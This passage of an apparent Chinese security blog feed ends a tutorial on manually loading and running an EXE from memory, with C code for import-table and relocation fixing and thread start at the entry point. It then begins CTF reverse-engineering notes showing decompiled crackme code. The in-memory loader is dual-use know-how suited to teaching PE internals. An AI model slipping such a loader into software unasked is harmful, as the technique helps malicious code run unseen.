&#123;</span><br><span class="line">CHAR* namefoaAddr = numOrName + pData;</span><br><span class="line">IMAGE_IMPORT_BY_NAME* impByName = (IMAGE_IMPORT_BY_NAME*)namefoaAddr;</span><br><span class="line"><span class="comment">//修复导入表中按名字导入的函数地址</span></span><br><span class="line">DWORD funAddr = (DWORD)GetProcAddress(dllModule, (LPCSTR)impByName-&gt;Name);</span><br><span class="line">*addTemp = funAddr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"按名字导入Name:%s funAddr:%x dllName:%s"</span>, impByName-&gt;Name, funAddr, pData + impTable-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指向下一个INT表</span></span><br><span class="line">IntThunkData++;</span><br><span class="line"><span class="comment">//指向下一个IAT表</span></span><br><span class="line">IatThunkData++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//指向下一个导入表 结构体</span></span><br><span class="line">impTable++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三、修复重定位表"><a href="#三、修复重定位表" class="headerlink" title="三、修复重定位表"></a>三、修复重定位表</h1><p>PE文件中有些地址使用的是绝对地址而不是相对地址，所以当PE文件没有被贴到ImageBase指定的地址时，需要对这些地址进行重定位。<strong>修正方法：需要重定位的地址 - 以前的基址 + 当前的基址。</strong></p><p><img src="/2020/07/24/内存加载运行EXE/Reloc.png" alt="文件加载到内存"></p><h3 id="1-遍历IMAGE-BASE-RELOCATION"><a href="#1-遍历IMAGE-BASE-RELOCATION" class="headerlink" title="1.遍历IMAGE_BASE_RELOCATION"></a>1.遍历IMAGE_BASE_RELOCATION</h3><p>这个结构包括两个DWORD，VirtualAddress：表示需要重定位的<strong>内存页</strong>的相对虚拟地址。SizeOfBlock：表示当前重定位块的大小（包括VirutalAddress和SizeOfBlock的8个字节）<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure></p><h3 id="2-遍历重定位条目进行重定位"><a href="#2-遍历重定位条目进行重定位" class="headerlink" title="2.遍历重定位条目进行重定位"></a>2.遍历重定位条目进行重定位</h3><p>每个条目的前4个比特表示属性，如果为3表示是重定位的有效数据，剩下的12个比特正好表示4kB的偏移恰好覆盖一个内存页的大小。剩下的事情就是计算新的重定位地址。这里为了简单加载PE时VirtualAlloc的地址就为ImageBase，所以不进行重定位页能够运行。为了程序的兼容性还是补充了一下。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修复重定位表 拉伸后的状态</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">restoreIbuffRelocationTable</span><span class="params">(<span class="keyword">char</span>* i_buff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)i_buff;</span><br><span class="line">PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(i_buff + dos-&gt;e_lfanew);</span><br><span class="line">PIMAGE_DATA_DIRECTORY data_table = nt-&gt;OptionalHeader.DataDirectory;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重建重定位表的指针</span></span><br><span class="line">PIMAGE_BASE_RELOCATION first_relocation_table_addr = (PIMAGE_BASE_RELOCATION)(i_buff + data_table[<span class="number">5</span>].VirtualAddress);</span><br><span class="line">DWORD image_base = nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">DWORD image_base_offset = ((DWORD)i_buff - image_base);</span><br><span class="line"><span class="keyword">int</span> lump_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (first_relocation_table_addr-&gt;SizeOfBlock &gt; <span class="number">0xA</span> &amp;&amp; first_relocation_table_addr-&gt;VirtualAddress)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"重定位表第%d块开始============\n"</span>,++lump_count);</span><br><span class="line">DWORD block = first_relocation_table_addr-&gt;SizeOfBlock;</span><br><span class="line">DWORD virtual_addr = first_relocation_table_addr-&gt;VirtualAddress;</span><br><span class="line"><span class="comment">//计算重定位表中的每个块中所包含的地址数量</span></span><br><span class="line"><span class="keyword">size_t</span> addr_count = (block - <span class="keyword">sizeof</span>(block)-<span class="keyword">sizeof</span>(virtual_addr)) / <span class="keyword">sizeof</span>(WORD);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"本块中共 %d个地址\n"</span>, addr_count);</span><br><span class="line">WORD* temp_relocation = (WORD*)first_relocation_table_addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"block:%d\t | virtual_addr:%x\t | addr_count:%d\n"</span>,block, virtual_addr,addr_count);</span><br><span class="line">temp_relocation += <span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; addr_count; i++)</span><br><span class="line">&#123;</span><br><span class="line">WORD relocation_addr = *temp_relocation;</span><br><span class="line"><span class="keyword">int</span> valid_flag = relocation_addr &gt;&gt; <span class="number">12</span>;</span><br><span class="line"><span class="keyword">if</span> (valid_flag == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">DWORD valid_relocation_addr = virtual_addr + (relocation_addr &amp; <span class="number">0x0fff</span>);</span><br><span class="line"><span class="keyword">char</span>* changeAddr = i_buff + valid_relocation_addr;</span><br><span class="line">DWORD changeAddrNum = *((DWORD*)changeAddr);</span><br><span class="line">*((DWORD*)changeAddr) = changeAddrNum + image_base_offset;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"有效地址:%2d: %XH Base的值为:%XH \n"</span>, i + <span class="number">1</span>, valid_relocation_addr, virtual_addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"无效地址%2d: - \t\t - \n"</span>, i + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">temp_relocation += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">first_relocation_table_addr = (PIMAGE_BASE_RELOCATION)(((<span class="keyword">char</span>*)first_relocation_table_addr) + block);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"重定位表第%d块结束=============\n"</span>, lump_count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"重定位表共有%d块"</span>, lump_count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="四、加载运行"><a href="#四、加载运行" class="headerlink" title="四、加载运行"></a>四、加载运行</h1><p>剩下的事情就是CreateThread并将运行函数的地址设置为OEP<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建线程 执行加载的exe入口函数</span></span><br><span class="line">HANDLE executeThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)(vir + thePeHeaders.OptionalHeader-&gt;AddressOfEntryPoint), <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//等待加载的可执行文件执行完毕 程序退出</span></span><br><span class="line">WaitForSingleObject(executeThread, INFINITE);</span><br></pre></td></tr></table></figure></p><h1 id="五、编译设置"><a href="#五、编译设置" class="headerlink" title="五、编译设置"></a>五、编译设置</h1><p>为了将程序加载到原来的ImageBase（大部分程序的Imagebase都是0x400000）,需要将这个地址空出来。vs2019可以通过项目-》属性-》连接器-》高级 进行设置。将其中的基址设为0x2000000。随机基址设置为：否。固定基址设置为是。如下图所示</p><p><img src="/2020/07/24/内存加载运行EXE/项目设置.png" alt="文件加载到内存"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>打造自己的PE解释器：<a href="https://bbs.pediy.com/thread-252795.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-252795.htm</a></p><p>代码主要参考：<a href="https://github.com/18310799137/LoadExe" target="_blank" rel="noopener">https://github.com/18310799137/LoadExe</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;如何将其他程序加载到内存中运行？有点类似exe加载器。A.exe将B.exe加载到内存中运行需要几步？只需要4步&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一步：将B.exe读取到内存中并拉伸&lt;/li&gt;
&lt;li&gt;第二步：修复B.exe的IAT表&lt;/li&gt;
&lt;li&gt;第三步：修复B.exe的重定位表&lt;/li&gt;
&lt;li&gt;第四步：运行B.exe&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="安全" scheme="https://bigkan.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础" scheme="https://bigkan.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="windows" scheme="https://bigkan.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>z3学习笔记---实战两道ctf题目</title>
    <link href="https://bigkan.github.io/2019/09/16/z3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%AE%9E%E6%88%98%E4%B8%A4%E9%81%93ctf%E9%A2%98%E7%9B%AE/"/>
    <id>https://bigkan.github.io/2019/09/16/z3学习笔记-实战两道ctf题目/</id>
    <published>2019-09-16T10:35:12.000Z</published>
    <updated>2020-07-02T15:07:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在两次遇到需要用z3来线性求解的题目，而且两个题目当时都没做出来，第一道是TokyoWesterns CTF easy_crack_me，第二道是护网杯re_quiz_middle</p><blockquote><p>1、2019 TokyoWesterns CTF -&gt; easy_crack_me<br>2、2019 护网杯 re_quiz_middle</p></blockquote><h1 id="easy-crack-me"><a href="#easy-crack-me" class="headerlink" title="easy_crack_me"></a>easy_crack_me</h1><p>下面是ida f5查看的结果，简单的校验如下</p><blockquote><p>1、检查输入的字符串长度是否为39<br>2、是否以”TWCTF{“开头，以”}”结尾<br>3、统计中间字符串0-9a-f字符的个数并进行比较<br>4、4位为一组，相加得到v21数组，异或得到v25数组和dword_400F40、dword_400F60进行比较<br>5、每隔8位，4个相加得到v29数组，4个异或得到v33数组和dword_400FA0、dword_400F80进行比较<br>6、当前字符为0-9表示为0xff，a-f表示为0x80和dword_400FC0进行比较<br>7、每隔两个相加等于1160<br>8、s[7]==’f’ s[11]==’9’ s[12]==’7’ s[23]=’2’ s[31]==’4’ s[37]==’5’</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *j; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// ST1F_1</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// ST1E_1</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+1Dh] [rbp-1B3h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-1B0h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> k; <span class="comment">// [rsp+24h] [rbp-1ACh]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+28h] [rbp-1A8h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+2Ch] [rbp-1A4h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> l; <span class="comment">// [rsp+30h] [rbp-1A0h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> m; <span class="comment">// [rsp+34h] [rbp-19Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+38h] [rbp-198h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+3Ch] [rbp-194h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> n; <span class="comment">// [rsp+40h] [rbp-190h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> ii; <span class="comment">// [rsp+44h] [rbp-18Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+48h] [rbp-188h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> jj; <span class="comment">// [rsp+4Ch] [rbp-184h]</span></span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [rsp+58h] [rbp-178h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+70h] [rbp-160h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+78h] [rbp-158h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+80h] [rbp-150h]</span></span><br><span class="line">  __int64 v24; <span class="comment">// [rsp+88h] [rbp-148h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+90h] [rbp-140h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+98h] [rbp-138h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+A0h] [rbp-130h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+A8h] [rbp-128h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+B0h] [rbp-120h]</span></span><br><span class="line">  __int64 v30; <span class="comment">// [rsp+B8h] [rbp-118h]</span></span><br><span class="line">  __int64 v31; <span class="comment">// [rsp+C0h] [rbp-110h]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+C8h] [rbp-108h]</span></span><br><span class="line">  __int64 v33; <span class="comment">// [rsp+D0h] [rbp-100h]</span></span><br><span class="line">  __int64 v34; <span class="comment">// [rsp+D8h] [rbp-F8h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+E0h] [rbp-F0h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+E8h] [rbp-E8h]</span></span><br><span class="line">  __int64 s1; <span class="comment">// [rsp+F0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+F8h] [rbp-D8h]</span></span><br><span class="line">  __int64 v39; <span class="comment">// [rsp+100h] [rbp-D0h]</span></span><br><span class="line">  __int64 v40; <span class="comment">// [rsp+108h] [rbp-C8h]</span></span><br><span class="line">  __int64 v41; <span class="comment">// [rsp+110h] [rbp-C0h]</span></span><br><span class="line">  __int64 v42; <span class="comment">// [rsp+118h] [rbp-B8h]</span></span><br><span class="line">  __int64 v43; <span class="comment">// [rsp+120h] [rbp-B0h]</span></span><br><span class="line">  __int64 v44; <span class="comment">// [rsp+128h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">int</span> v45[<span class="number">32</span>]; <span class="comment">// [rsp+130h] [rbp-A0h]</span></span><br><span class="line">  __int64 v46; <span class="comment">// [rsp+1B0h] [rbp-20h]</span></span><br><span class="line">  __int64 v47; <span class="comment">// [rsp+1B8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v48; <span class="comment">// [rsp+1C8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v48 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s = a2[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a2[<span class="number">1</span>]) != <span class="number">39</span> )                  <span class="comment">// 长度39</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(s, <span class="string">"TWCTF&#123;"</span>, <span class="number">6u</span>LL) || s[<span class="number">38</span>] != <span class="string">'&#125;'</span> )<span class="comment">// 内容32</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    s1 = <span class="number">0L</span>L;</span><br><span class="line">    v38 = <span class="number">0L</span>L;</span><br><span class="line">    v39 = <span class="number">0L</span>L;</span><br><span class="line">    v40 = <span class="number">0L</span>L;</span><br><span class="line">    v41 = <span class="number">0L</span>L;</span><br><span class="line">    v42 = <span class="number">0L</span>L;</span><br><span class="line">    v43 = <span class="number">0L</span>L;</span><br><span class="line">    v44 = <span class="number">0L</span>L;</span><br><span class="line">    v46 = <span class="number">0x3736353433323130</span>LL;</span><br><span class="line">    v47 = <span class="number">0x6665646362613938</span>LL;                 <span class="comment">// 0-9a-f</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="built_in">strchr</span>(s, *((<span class="keyword">char</span> *)&amp;v46 + i)); j; j = <span class="built_in">strchr</span>(j + <span class="number">1</span>, *((<span class="keyword">char</span> *)&amp;v46 + i)) )<span class="comment">// 把0-9a-f进行计数</span></span><br><span class="line">        ++*((_DWORD *)&amp;s1 + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;s1, &amp;dword_400F00, <span class="number">0x40</span>uLL) )  <span class="comment">// 计数进行比较</span></span><br><span class="line">                                                <span class="comment">// 0:3 1:2 2:2 3:0 4:3 5:2 6:1 7:3 </span></span><br><span class="line">                                                <span class="comment">// 8:3 9:1 a:1 b:3 c:1 d:2 e:2 f:3</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v21 = <span class="number">0L</span>L;</span><br><span class="line">    v22 = <span class="number">0L</span>L;</span><br><span class="line">    v23 = <span class="number">0L</span>L;</span><br><span class="line">    v24 = <span class="number">0L</span>L;</span><br><span class="line">    v25 = <span class="number">0L</span>L;</span><br><span class="line">    v26 = <span class="number">0L</span>L;</span><br><span class="line">    v27 = <span class="number">0L</span>L;</span><br><span class="line">    v28 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">7</span>; ++k )                  <span class="comment">// 4位为一组，相加得到v21数组，异或得到v25数组</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">0</span>;</span><br><span class="line">      v11 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">3</span>; ++l )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = s[<span class="number">4</span> * k + <span class="number">6</span> + l];</span><br><span class="line">        v10 += v5;</span><br><span class="line">        v11 ^= v5;</span><br><span class="line">      &#125;</span><br><span class="line">      *((_DWORD *)&amp;v21 + k) = v10;</span><br><span class="line">      *((_DWORD *)&amp;v25 + k) = v11;</span><br><span class="line">    &#125;</span><br><span class="line">    v29 = <span class="number">0L</span>L;</span><br><span class="line">    v30 = <span class="number">0L</span>L;</span><br><span class="line">    v31 = <span class="number">0L</span>L;</span><br><span class="line">    v32 = <span class="number">0L</span>L;</span><br><span class="line">    v33 = <span class="number">0L</span>L;</span><br><span class="line">    v34 = <span class="number">0L</span>L;</span><br><span class="line">    v35 = <span class="number">0L</span>L;</span><br><span class="line">    v36 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">7</span>; ++m )                  <span class="comment">// 每隔8位，4个相加得到v29数组，4个异或得到v33数组</span></span><br><span class="line">    &#123;</span><br><span class="line">      v14 = <span class="number">0</span>;</span><br><span class="line">      v15 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">3</span>; ++n )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = s[<span class="number">8</span> * n + <span class="number">6</span> + m];</span><br><span class="line">        v14 += v6;</span><br><span class="line">        v15 ^= v6;</span><br><span class="line">      &#125;</span><br><span class="line">      *((_DWORD *)&amp;v29 + m) = v14;</span><br><span class="line">      *((_DWORD *)&amp;v33 + m) = v15;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;v21, &amp;dword_400F40, <span class="number">0x20</span>uLL) || <span class="built_in">memcmp</span>(&amp;v25, &amp;dword_400F60, <span class="number">0x20</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;v29, &amp;dword_400FA0, <span class="number">0x20</span>uLL) || <span class="built_in">memcmp</span>(&amp;v33, &amp;dword_400F80, <span class="number">0x20</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(v45, <span class="number">0</span>, <span class="keyword">sizeof</span>(v45));</span><br><span class="line">    <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">31</span>; ++ii )              <span class="comment">// 47&lt;v7&lt;=57 255</span></span><br><span class="line">                                                <span class="comment">// 96&lt;v7&lt;=102 128</span></span><br><span class="line">                                                <span class="comment">// 其他 0</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = s[ii + <span class="number">6</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v7 &lt;= <span class="number">47</span> || v7 &gt; <span class="number">57</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v7 &lt;= <span class="number">96</span> || v7 &gt; <span class="number">102</span> )</span><br><span class="line">          v45[ii] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v45[ii] = <span class="number">128</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v45[ii] = <span class="number">255</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v45, &amp;dword_400FC0, <span class="number">0x80</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v18 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt;= <span class="number">15</span>; ++jj )              <span class="comment">// 每隔两个相加得1160</span></span><br><span class="line">      v18 += s[<span class="number">2</span> * (jj + <span class="number">3</span>)];</span><br><span class="line">    <span class="keyword">if</span> ( v18 != <span class="number">1160</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">      